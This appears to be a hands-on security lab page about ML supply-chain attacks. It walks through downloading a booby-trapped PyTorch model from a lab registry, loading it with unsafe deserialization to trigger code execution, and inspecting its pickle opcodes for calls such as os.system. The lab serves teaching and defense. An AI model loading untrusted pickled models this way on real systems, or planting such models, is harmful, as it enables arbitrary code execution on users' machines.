# Lab 6.1: AI/ML Model Supply Chain

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Malicious Model Execution

**Goal:** Load a malicious model and observe arbitrary code execution during `torch.load()`.

### Step 1: Download the malicious model

```bash
curl -s http://model-registry:8080/models/sentiment-classifier-v2/model.pt \
    -o /app/models/malicious_model.pt
```

### Step 2: Load the model

```bash
python3 -c "import torch; model = torch.load('/app/models/malicious_model.pt', weights_only=False); print('loaded')"
```

### Step 3: Check for compromise

```bash
cat /tmp/ml-model-pwned
```

**COMPROMISED.** The malicious model executed code during `torch.load()`. No errors, no warnings. The model even works normally for inference, making detection harder.

### Step 4: Examine what the attacker embedded

```bash
python3 -c "
import pickletools
with open('/app/models/malicious_model.pt', 'rb') as f:
    pickletools.dis(f, annotate=1)
"
```

Look for `REDUCE` opcodes followed by calls to `os.system`, `subprocess`, `exec`, or `eval`.

> **Checkpoint:** You should now have a compromise marker at `/tmp/ml-model-pwned`. If not, re-run Step 2.
